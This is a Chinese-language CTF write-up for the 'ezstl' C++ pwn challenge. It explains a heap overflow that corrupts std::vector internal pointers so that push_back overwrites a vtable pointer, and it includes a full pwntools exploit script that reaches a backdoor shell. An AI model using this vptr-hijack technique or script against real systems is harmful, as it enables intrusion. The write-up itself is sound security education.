# ezstl(300分)

## 一、 题目背景与前置知识

这是一道 64 位 Linux 下的 C++ Pwn 题，主要考察**堆溢出（Heap Overflow）** 和**C++ 虚表指针（vptr）劫持**。
由于这是用 C++ 写的，我们需要先理解以下几个核心概念：

1. **虚函数与 vptr**：当类中有 `virtual` 函数时，编译器会在对象内存的开头加上一个隐藏的 8 字节指针（vptr），指向虚函数表（vtable）。调用虚函数时，程序会通过 vptr 去表里找真实地址。**如果我们能覆盖 vptr，就能劫持控制流。**

2. **std::vector 的内存布局**：`std::vector` 内部由 3 个指针组成：`_M_start`（起始）、`_M_finish`（当前结束）、`_M_end_of_storage`（容量结束）。

3. **push_back 机制**：当`_M_finish != _M_end_of_storage` 时，`push_back` 会把数据写到 `_M_finish` 指向的地址，并将 `_M_finish` 往后挪。

## 二、 漏洞分析
我们来看源码中的关键数据结构与逻辑：

```cpp
struct Profile {
    char name[0x30];            // 偏移 0x00，大小 48 字节
    std::vector<void *> styles; // 偏移 0x30，包含三个指针，大小 24 字节
    Badge badge;                // 偏移 0x48，大小 8 字节（vptr）
};

struct HeapData {
    Profile profile;
    StyleData custom_style;
};
```

**漏洞点**在这里：

```cpp
HeapData *data = new HeapData;
Profile *profile = &data->profile;
// ...
printf("name: ");
read(0, profile->name, 0x48); // 读入 72 字节，但 name 只有 48 字节
```

`read` 导致严重的**堆溢出**。溢出的 24 字节正好覆盖了 `styles` 向量的三个内部指针。

## 三、 利用思路
我们的最终目标是让 `badge->show()` 执行后门函数 `win`。

1. **泄露信息**：
程序会主动打印 `profile` 的堆地址，以及后门函数 `win` 的地址。这两个信息我们直接接收。

2. **覆盖 vector 指针**：
通过溢出，把 `_M_finish` 改写成 `profile + 0x48`（即 `badge` 的 vptr 地址）。
把 `_M_end_of_storage` 改写成任意大于它的值（如 `profile + 0x50`），保证 `push_back` 走“不扩容”分支。

3. **篡改 vptr**：
执行 `add_style(profile, custom_style)` 时，触发 `styles.push_back(custom_style)`。
此时因为 `_M_finish` 被我们指向了 vptr，`push_back` 会把 `custom_style` 的地址写入 vptr。

4. **写入后门地址**：
程序接着提示 `style data`: 并要求输入。输入 `win` 的地址，程序会把它存入 `custom_style->slot[0]`。

5. **触发虚函数**：
最后程序调用 `check_badge(&profile->badge)`。此时 `badge` 的 vptr 指向 `custom_style`，而 `custom_style` 里的内容是 `win` 的地址，成功拿 Shell。

## 四、 踩坑记录（复盘）
- **误判漏洞类型**：一开始以为是栈溢出改 `ret` 返回地址，后来发现目标数据全在堆上，实际是堆溢出 + 虚表劫持。

- **交互顺序死锁**：在写 Exp 时，把“接收 `win` 地址”和“发送溢出 Payload”的顺序搞反了。因为 `read` 需要先接收 72 字节的 Payload，程序才会往下执行去打印 `win` 地址，顺序反了会导致程序卡死在 `read` 处。

## 五、 最终 Exploit 脚本
```python
from pwn import *

# 连接目标
# p = process('./full-reduction')
p = remote('ip', port)

# 1. 接收泄露的堆地址
p.recvuntil(b'profile: ')
profile = int(p.recvline().strip(), 16)

# 2. 构造堆溢出 Payload (精确覆盖 vector 的三个指针)
p.recvuntil(b'name: ')
payload  = b'A' * 0x30              # 填满 name 数组
payload += p64(0)                    # _M_start (随便填)
payload += p64(profile + 0x48)       # _M_finish -> 指向 badge 的 vptr
payload += p64(profile + 0x50)       # _M_end_of_storage -> 只要大于 finish 即可
p.send(payload)                      # 必须发送满 0x48 字节

# 3. 接收后门函数 win 的地址
p.recvuntil(b'win: ')
win_addr = int(p.recvline().strip(), 16)

# 4. 将 win 地址写入 custom_style->slot[0] (此时 badge vptr 已经被 push_back 篡改)
p.recvuntil(b'style data: ')
p.sendline(hex(win_addr).encode())

# 5. 触发虚函数调用，拿 shell
p.interactive()
```

## 六、 总结与反思
这道题是我从“纯栈溢出”迈向“堆漏洞利用”的重要一步。
它让我深刻理解到：

1. `class` 和 `struct` 在内存里本质是一样的，但 `virtual` 关键字会引入额外 8 字节的 vptr，这往往成为漏洞的突破点。

2. C++ 的 STL 容器（如 `vector`）在底层极其依赖裸指针，一旦发生溢出，通过篡改内部指针结合类自身的机制（如 `push_back`），可以实现非常隐蔽的任意地址写。